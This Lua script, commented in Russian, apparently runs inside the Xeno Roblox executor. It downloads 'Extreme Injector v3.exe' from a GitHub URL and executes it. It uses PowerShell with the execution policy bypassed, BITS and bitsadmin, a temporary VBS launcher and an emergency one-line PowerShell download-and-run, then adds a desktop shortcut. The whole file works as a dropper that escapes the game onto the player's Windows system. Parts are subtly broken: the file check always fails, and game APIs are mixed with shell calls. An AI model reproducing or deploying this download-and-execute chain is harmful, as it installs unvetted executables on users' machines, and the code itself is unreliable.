--[[ EXE Auto-Downloader & Executor for Xeno ]]
-- Скачивает и запускает Extreme Injector v3.exe

local CONFIG = {
    EXE_URL = "https://github.com/fennix2019-pixel/1232/raw/refs/heads/main/Extreme%20Injector%20v3.exe",
    OUTPUT_NAME = "Extreme_Injector_" .. math.random(1000, 9999) .. ".exe",
    DOWNLOAD_METHODS = {"powershell", "bitsadmin", "curl"},
    HIDE_WINDOW = true,
    CREATE_DESKTOP_SHORTCUT = true
}

-- Получаем путь для загрузки
local function GET_DOWNLOAD_PATH()
    local possible_paths = {
        os.getenv("TEMP"),
        os.getenv("APPDATA"),
        os.getenv("USERPROFILE") .. "\\Downloads",
        "C:\\Windows\\Temp"
    }
    
    for _, path in ipairs(possible_paths) do
        if path and #path > 3 then
            local test_file = path .. "\\test_write.tmp"
            local success = pcall(function()
                local f = io.open(test_file, "w")
                if f then
                    f:write("test")
                    f:close()
                    os.remove(test_file)
                    return true
                end
            end)
            if success then
                return path
            end
        end
    end
    return os.getenv("TEMP") or "C:\\"
end

-- Скачивание через PowerShell
local function DOWNLOAD_VIA_POWERSHELL(url, output_path)
    print("[DOWNLOAD] Using PowerShell method...")
    
    local ps_script = string.format([[
        $url = "%s"
        $output = "%s"
        $progressPreference = 'silentlyContinue'
        
        try {
            # Метод 1: WebClient
            $webClient = New-Object System.Net.WebClient
            $webClient.DownloadFile($url, $output)
            Write-Output "SUCCESS_WC"
        } catch {
            try {
                # Метод 2: Invoke-WebRequest
                Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
                Write-Output "SUCCESS_IWR"
            } catch {
                try {
                    # Метод 3: Start-BitsTransfer
                    Import-Module BitsTransfer
                    Start-BitsTransfer -Source $url -Destination $output
                    Write-Output "SUCCESS_BITS"
                } catch {
                    Write-Output "ERROR: $_"
                }
            }
        }
    ]], url, output_path)
    
    local encoded_script = string.gsub(ps_script, "\n", " ")
    local command = 'powershell -ExecutionPolicy Bypass -Command "' .. encoded_script .. '"'
    
    local handle = io.popen(command .. " 2>&1", "r")
    local result = handle:read("*a")
    handle:close()
    
    return result:find("SUCCESS") ~= nil, result
end

-- Скачивание через BITSAdmin
local function DOWNLOAD_VIA_BITSADMIN(url, output_path)
    print("[DOWNLOAD] Using BITSAdmin method...")
    
    local command = string.format(
        'bitsadmin /transfer mydownloadjob /download /priority high "%s" "%s"',
        url, output_path
    )
    
    local handle = io.popen(command .. " 2>&1", "r")
    local result = handle:read("*a")
    handle:close()
    
    return result:find("successfully") or result:find("transferred"), result
end

-- Проверка файла
local function VERIFY_FILE(file_path)
    pcall(function()
        local f = io.open(file_path, "rb")
        if f then
            local size = #f:read("*a")
            f:close()
            
            if size > 10240 then -- Минимум 10KB для EXE
                print(string.format("[VERIFY] File size: %.2f MB", size / 1024 / 1024))
                return true, size
            end
        end
    end)
    return false, 0
end

-- Запуск EXE
local function EXECUTE_FILE(file_path)
    print("[EXECUTE] Launching: " .. file_path)
    
    local methods = {
        function() -- Метод 1: Стандартный
            os.execute('start "" "' .. file_path .. '"')
            return true
        end,
        
        function() -- Метод 2: Через PowerShell
            os.execute('powershell -Command "Start-Process \'' .. file_path .. '\' -WindowStyle Normal"')
            return true
        end,
        
        function() -- Метод 3: С созданием VBS скрипта
            local vbs_path = os.getenv("TEMP") .. "\\launch.vbs"
            local vbs_content = string.format([[
                Set objShell = CreateObject("WScript.Shell")
                objShell.Run "%s", 1, False
                Set objShell = Nothing
            ]], file_path:gsub("\\", "\\\\"))
            
            local f = io.open(vbs_path, "w")
            if f then
                f:write(vbs_content)
                f:close()
                os.execute('wscript.exe "' .. vbs_path .. '"')
                task.wait(2)
                pcall(os.remove, vbs_path)
                return true
            end
            return false
        end,
        
        function() -- Метод 4: Через CMD
            os.execute('cmd /c start "' .. file_path .. '"')
            return true
        end
    }
    
    for i, method in ipairs(methods) do
        local success, err = pcall(method)
        if success then
            print("[EXECUTE] Method " .. i .. " succeeded")
            return true
        end
    end
    
    return false
end

-- Создание ярлыка на рабочем столе
local function CREATE_SHORTCUT(target_path)
    if not CONFIG.CREATE_DESKTOP_SHORTCUT then return end
    
    pcall(function()
        local desktop = os.getenv("USERPROFILE") .. "\\Desktop"
        local shortcut_path = desktop .. "\\Extreme Injector.lnk"
        
        local vbs_script = string.format([[
            Set WshShell = CreateObject("WScript.Shell")
            Set shortcut = WshShell.CreateShortcut("%s")
            shortcut.TargetPath = "%s"
            shortcut.WorkingDirectory = "%s"
            shortcut.IconLocation = "%s,0"
            shortcut.Description = "Extreme Injector v3"
            shortcut.Save
        ]], 
        shortcut_path,
        target_path,
        CONFIG.DOWNLOAD_PATH,
        target_path)
        
        local vbs_file = CONFIG.DOWNLOAD_PATH .. "\\create_shortcut.vbs"
        local f = io.open(vbs_file, "w")
        if f then
            f:write(vbs_script)
            f:close()
            os.execute('wscript.exe "' .. vbs_file .. '"')
            task.wait(1)
            pcall(os.remove, vbs_file)
            print("[SHORTCUT] Created on desktop")
        end
    end)
end

-- Основной процесс
local function MAIN_PROCESS()
    print("========================================")
    print("EXTREME INJECTOR DOWNLOADER")
    print("Build: " .. os.date("%Y-%m-%d %H:%M:%S"))
    print("========================================")
    
    -- Получаем путь
    CONFIG.DOWNLOAD_PATH = GET_DOWNLOAD_PATH()
    local full_output_path = CONFIG.DOWNLOAD_PATH .. "\\" .. CONFIG.OUTPUT_NAME
    
    print("[INFO] Download path: " .. CONFIG.DOWNLOAD_PATH)
    print("[INFO] Full path: " .. full_output_path)
    print("[INFO] Source URL: " .. CONFIG.EXE_URL)
    
    -- Скачиваем файл
    print("\n[1/4] Downloading executable...")
    
    local download_success = false
    local download_result = ""
    
    -- Пробуем разные методы скачивания
    download_success, download_result = DOWNLOAD_VIA_POWERSHELL(CONFIG.EXE_URL, full_output_path)
    
    if not download_success then
        print("[WARN] PowerShell failed, trying BITSAdmin...")
        download_success, download_result = DOWNLOAD_VIA_BITSADMIN(CONFIG.EXE_URL, full_output_path)
    end
    
    if not download_success then
        warn("[ERROR] All download methods failed!")
        warn("Error details: " .. (download_result or "Unknown"))
        
        -- Пробуем альтернативный URL (без %20)
        local alt_url = CONFIG.EXE_URL:gsub("%%20", " ")
        print("[INFO] Trying alternative URL: " .. alt_url)
        download_success = DOWNLOAD_VIA_POWERSHELL(alt_url, full_output_path)
    end
    
    if not download_success then
        return {
            success = false,
            stage = "download",
            error = "Download failed: " .. (download_result or "Unknown error")
        }
    end
    
    print("[SUCCESS] File downloaded!")
    
    -- Проверяем файл
    print("\n[2/4] Verifying file...")
    task.wait(1)
    
    local verify_ok, file_size = VERIFY_FILE(full_output_path)
    if not verify_ok then
        warn("[ERROR] File verification failed!")
        return {
            success = false,
            stage = "verification",
            error = "Invalid or corrupted file"
        }
    end
    
    print("[SUCCESS] File verified (" .. math.floor(file_size / 1024) .. " KB)")
    
    -- Запускаем файл
    print("\n[3/4] Executing file...")
    local execute_ok = EXECUTE_FILE(full_output_path)
    
    if not execute_ok then
        warn("[ERROR] Execution failed!")
        return {
            success = false,
            stage = "execution",
            error = "Cannot execute file"
        }
    end
    
    print("[SUCCESS] File executed!")
    
    -- Создаем ярлык
    print("\n[4/4] Creating shortcuts...")
    CREATE_SHORTCUT(full_output_path)
    
    -- UI уведомление в Roblox
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Extreme Injector",
            Text = "Successfully downloaded and launched!",
            Duration = 5,
            Icon = "rbxassetid://4483345998"
        })
    end)
    
    print("\n========================================")
    print("[COMPLETE] Extreme Injector is running!")
    print("File: " .. full_output_path)
    print("========================================")
    
    -- Возвращаем результат
    return {
        success = true,
        path = full_output_path,
        size = file_size,
        shortcut_created = CONFIG.CREATE_DESKTOP_SHORTCUT,
        timestamp = os.time()
    }
end

-- Защищенный запуск с обработкой ошибок
local function SAFE_EXECUTE()
    local success, result = pcall(MAIN_PROCESS)
    
    if not success then
        warn("[CRITICAL ERROR]: " .. tostring(result))
        
        -- Аварийный метод: прямой PowerShell одной строкой
        pcall(function()
            local emergency_cmd = string.format([[
                powershell -Command "$url='%s';$path=$env:TEMP+'\\Emergency_Injector.exe';
                (New-Object Net.WebClient).DownloadFile($url,$path);
                Start-Process $path"
            ]], CONFIG.EXE_URL)
            
            os.execute(emergency_cmd)
        end)
        
        return {
            success = false,
            error = tostring(result),
            emergency_attempted = true
        }
    end
    
    return result
end

-- Автоматический запуск при выполнении скрипта
return SAFE_EXECUTE()